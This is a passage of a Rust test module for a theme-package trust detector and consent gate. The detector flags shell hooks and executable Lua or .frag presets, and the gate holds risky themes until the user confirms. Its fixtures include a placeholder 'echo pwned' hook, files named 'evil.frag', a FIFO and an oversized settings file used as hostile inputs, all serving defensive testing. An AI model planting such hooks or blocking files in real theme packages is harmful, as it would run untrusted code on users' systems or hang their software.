    /// finds into the fragment `assemble.sh` writes to `overlay.lua` — so a
    /// `.frag` carrying Lua there executes exactly like a `.lua`.
    ///
    /// `shaders/` is the deliberate asymmetry this detector mirrors:
    /// `shader.sh` never `cat`s the shader (it writes a validated Lua
    /// wrapper whose PATH names the built-in shader), so `shaders/*.frag`
    /// never reaches `overlay.lua` and stays OUT of the report — while
    /// `shaders/*.lua` is still named like every other Lua preset.
    #[test]
    fn a_frag_in_a_catted_category_is_reported_but_a_shader_frag_is_not() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "evil.frag");
        write_preset(&theme, "borders", "evil.frag");
        write_preset(&theme, "shaders", "02_monocromo.frag");
        write_preset(&theme, "shaders", "wrapper.lua");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets,
            vec![
                LuaPreset {
                    category: "animations".into(),
                    file_name: "evil.frag".into(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "evil.frag".into(),
                },
                LuaPreset {
                    category: "shaders".into(),
                    file_name: "wrapper.lua".into(),
                },
            ],
            "a .frag in a category the scripts cat must be reported and \
             shaders/*.frag must not, got: {:?}",
            report.lua_presets
        );
        assert!(!report.is_empty(), "the .frag presets must not read as empty");
    }

    /// Acceptance 2: a theme carrying neither applies exactly as before —
    /// the detector says so with an empty report.
    #[test]
    fn a_theme_with_neither_hooks_nor_lua_is_empty() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let provider = theme.join("providers").join("hve-presets");
        fs::create_dir_all(&provider).unwrap();
        fs::write(provider.join("state.json"), "{\"active_anim_file\":\"x.lua\"}").unwrap();

        let report = inspect_theme_package(&theme);

        assert_eq!(report, ThemeTrustReport::default());
        assert!(report.is_empty());
    }

    /// READ-ONLY and TOTAL: inspecting a theme changes nothing on disk, and
    /// a theme path that does not exist yields an empty report without being
    /// created (a detector never writes).
    #[test]
    fn inspection_is_read_only_and_never_creates_anything() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\nstarted = \"x.sh\"\n");
        write_preset(&theme, "animations", "a.lua");
        let before = tree(&theme);

        let _ = inspect_theme_package(&theme);
        assert_eq!(tree(&theme), before, "inspection must not touch the tree");

        let missing = tmp.path().join("NeverExisted");
        assert!(inspect_theme_package(&missing).is_empty());
        assert!(
            !missing.exists(),
            "the detector must never create the theme directory it is given"
        );
    }

    /// TOTAL: a settings.toml that is missing, empty or garbage never
    /// panics, and the parser reports what it CAN read — even from the
    /// garbage, an unterminated quote after a real `[hooks]` header still
    /// surfaces the command text instead of hiding the hook.
    #[test]
    fn a_missing_empty_or_garbage_settings_toml_never_panics() {
        let tmp = tempfile::tempdir().unwrap();

        // Missing: the provider dir exists, the file does not.
        let missing = tmp.path().join("Missing");
        fs::create_dir_all(missing.join("providers").join("noctalia-v5")).unwrap();

        // Empty.
        let empty = tmp.path().join("Empty");
        write_settings(&empty, "");

        // Garbage.
        let garbage = tmp.path().join("Garbage");
        write_settings(
            &garbage,
            "@@@ not toml at all\n\
             no equals sign here\n\
             [hooks\n\
             started = \"lost under the broken header\"\n\
             [hooks]\n\
             colors_changed = \"still a command\n\
             = \"no key\"\n\
             nothing_here\n\
             ",
        );

        assert!(inspect_theme_package(&missing).shell_hooks.is_empty());
        assert!(inspect_theme_package(&empty).shell_hooks.is_empty());
        let report = inspect_theme_package(&garbage);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "colors_changed".into(),
                command: "still a command".into(),
            }],
            "what can be read is reported, what cannot is skipped: {:?}",
            report.shell_hooks
        );
    }

    /// TOTAL: a non-UTF8 settings.toml cannot be read as text at all — the
    /// report just narrows to nothing instead of panicking.
    #[test]
    fn a_non_utf8_settings_toml_never_panics() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("settings.toml"), b"\xff\xfe[hooks]\nstarted = \"\xff\xfe\"\n")
            .unwrap();

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty());
    }

    /// TOTAL: a preset file name that is not valid UTF-8 is skipped, exactly
    /// like `install_theme_presets` skips it (it can never be installed, so
    /// it can never run).
    #[cfg(unix)]
    #[test]
    fn a_preset_file_name_that_is_not_utf8_is_skipped() {
        use std::os::unix::ffi::OsStrExt;
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join(crate::theme_presets::PRESETS_DIR).join("animations");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(std::ffi::OsStr::from_bytes(b"\xff.lua")), b"-- opaque\n").unwrap();

        let report = inspect_theme_package(&theme);

        assert!(report.lua_presets.is_empty(), "got: {:?}", report.lua_presets);
        assert!(report.is_empty());
    }

    // ── W2: the consent gate decisions ────────────────────────────────

    /// A package that carries a shell hook (the CRITICAL shape).
    fn risky_theme(root: &Path) -> PathBuf {
        let theme = root.join("Risky");
        write_settings(&theme, "[hooks]\nstarted = \"sddm-watch.sh\"\n");
        theme
    }

    /// A package that carries neither hooks nor Lua presets.
    fn clean_theme(root: &Path) -> PathBuf {
        let theme = root.join("Plain");
        let provider = theme.join("providers").join("hve-presets");
        fs::create_dir_all(&provider).unwrap();
        fs::write(provider.join("state.json"), "{}").unwrap();
        theme
    }

    /// W2 acceptance 3 (decision half): a theme carrying hooks is NOT
    /// applied — the gate holds it and shows the warning — and it applies
    /// ONLY after the keeper confirms, on the same entry point that asked.
    #[test]
    fn gate_holds_a_risky_theme_and_applies_it_only_after_confirmation() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
            GateDecision::Hold,
            "a theme carrying a shell hook must be held, not applied"
        );
        assert!(gate.is_open(), "the warning must be open for the held attempt");
        assert_eq!(
            gate.pending(),
            Some(&PendingApply {
                name: "Risky".into(),
                index: 3,
                origin: ApplyOrigin::Gallery,
            }),
            "the gate must remember what to apply and which path asked"
        );
        // A second attempt while the warning is open changes nothing.
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
            GateDecision::Blocked
        );

        // Confirm: the pending attempt comes back so the caller can
        // re-invoke the SAME entry point, armed for exactly that name.
        let pending = gate.begin_confirm().expect("a held attempt to confirm");
        assert_eq!(pending.name, "Risky");
        assert_eq!(pending.origin, ApplyOrigin::Gallery);
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
            GateDecision::Proceed,
            "the confirmed re-entry must apply exactly as before"
        );
        gate.finish_confirm();
        assert!(!gate.is_open(), "confirming must close the warning");
        assert_eq!(gate.confirmed(), None, "the confirmation is one-shot");

        // Consent is not remembered forever: applying that theme again
        // warns again.
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report),
            GateDecision::Hold,
            "a second apply of the same risky theme must warn again"
        );
    }

    /// W2 acceptance 3 (declining): Cancel forgets the attempt, applies
    /// nothing, and the next attempt asks again.
    #[test]
    fn gate_cancel_changes_nothing_and_the_next_attempt_warns_again() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Panel, &report),
            GateDecision::Hold
        );
        assert!(gate.cancel(), "declining a held attempt reports it");
        assert!(!gate.is_open(), "Cancel must close the warning");
        assert_eq!(gate.pending(), None, "nothing stays pending after Cancel");
        assert_eq!(
            gate.confirmed(),
            None,
            "Cancel must never arm a confirmation"
        );
        assert!(
            !gate.cancel(),
            "cancel with nothing pending is a no-op (idempotent)"
        );
        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Panel, &report),
            GateDecision::Hold,
            "after declining, applying the same theme must warn again"
        );
    }

    /// W2 acceptance 2: a theme carrying neither hooks nor Lua presets
    /// applies exactly as it did before the gate existed — no hold, no
    /// warning, no pending state.
    #[test]
    fn gate_lets_a_theme_with_neither_hooks_nor_lua_apply_without_a_warning() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&clean_theme(tmp.path()));
        assert!(report.is_empty(), "precondition: the fixture carries nothing");
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Gallery, &report),
            GateDecision::Proceed,
            "the pre-W2 behaviour must be untouched for a clean theme"
        );
        assert!(!gate.is_open());
        assert_eq!(gate.pending(), None);
        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Panel, &report),
            GateDecision::Proceed,
            "the second path must be gated by the same rule"
        );
    }

    /// The warning is MODAL: while it is open no other apply attempt gets
    /// through — not even a clean theme — and the pending attempt stays
    /// the one the keeper was asked about.
    #[test]
    fn gate_is_modal_while_the_warning_is_open() {
        let tmp = tempfile::tempdir().unwrap();
        let risky = inspect_theme_package(&risky_theme(tmp.path()));
        let clean = inspect_theme_package(&clean_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Gallery, &risky),
            GateDecision::Hold
        );
        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Gallery, &clean),
            GateDecision::Blocked,
            "nothing may apply behind the open warning"
        );
        assert_eq!(
            gate.request("Other", 2, ApplyOrigin::Panel, &risky),
            GateDecision::Blocked
        );
        assert_eq!(
            gate.pending().map(|p| p.name.as_str()),
            Some("Risky"),
            "the modal keeps the attempt it was opened for"
        );
    }

    /// A confirmation that never reached `request` (the mutating guard
    /// swallowed the re-entry, the window went away) must not leave stale
    /// consent: the next attempt on that theme warns again.
    #[test]
    fn a_confirmation_that_never_reaches_the_request_expires() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 5, ApplyOrigin::Gallery, &report),
            GateDecision::Hold
        );
        let pending = gate.begin_confirm().expect("held attempt");
        assert_eq!(pending.index, 5);
        // The re-invoke never happened: the caller closes the round trip.
        gate.finish_confirm();
        assert!(!gate.is_open());
        assert_eq!(
            gate.request("Risky", 5, ApplyOrigin::Gallery, &report),
            GateDecision::Hold,
            "an unspent confirmation must not silently apply the theme"
        );
    }

    // ── W10b: the theme's settings.toml is an UNTRUSTED file ───────────

    /// A FIFO named like a theme's `settings.toml` must be REFUSED by the
    /// trust gate, not block it: the gate runs on the apply path BEFORE the
    /// warning, so a blocking read would hang the whole apply. The scan runs
    /// on a worker thread, and a timeout proves it returned.
    #[test]
    fn inspect_refuses_a_fifo_settings_toml_instead_of_blocking() {
        use std::os::unix::ffi::OsStrExt;
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        let fifo = dir.join("settings.toml");
        let c = std::ffi::CString::new(fifo.as_os_str().as_bytes()).unwrap();
        let rc = unsafe { libc::mkfifo(c.as_ptr(), 0o600) };
        assert_eq!(rc, 0, "mkfifo must succeed for the sandbox fixture");

        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(inspect_theme_package(&theme));
        });
        match rx.recv_timeout(std::time::Duration::from_secs(3)) {
            Ok(report) => assert!(
                report.shell_hooks.is_empty(),
                "a FIFO settings.toml must declare no hooks, got {:?}",
                report.shell_hooks
            ),
            Err(_) => {
                panic!("the trust gate blocked on a FIFO settings.toml instead of refusing it")
            }
        }
    }

    /// An oversized (but valid) `settings.toml` is refused by W10's per-file
    /// bound: the gate must never slurp a multi-GB hostile file, and it
    /// degrades to "no hooks from this file", exactly like an unreadable one.
    #[test]
    fn inspect_refuses_an_oversized_settings_toml() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let settings = theme
            .join("providers")
            .join("noctalia-v5")
            .join("settings.toml");
        fs::create_dir_all(settings.parent().unwrap()).unwrap();
        let mut content = b"[hooks]\nstarted = \"echo pwned\"\n".to_vec();
        content.resize(crate::theme_package::MAX_THEME_FILE_BYTES as usize + 1, b'\n');
        fs::write(&settings, content).unwrap();

        let report = inspect_theme_package(&theme);
        assert!(
            report.shell_hooks.is_empty(),
            "an over-bound settings.toml must declare no hooks, got {:?}",
            report.shell_hooks
        );
    }
}
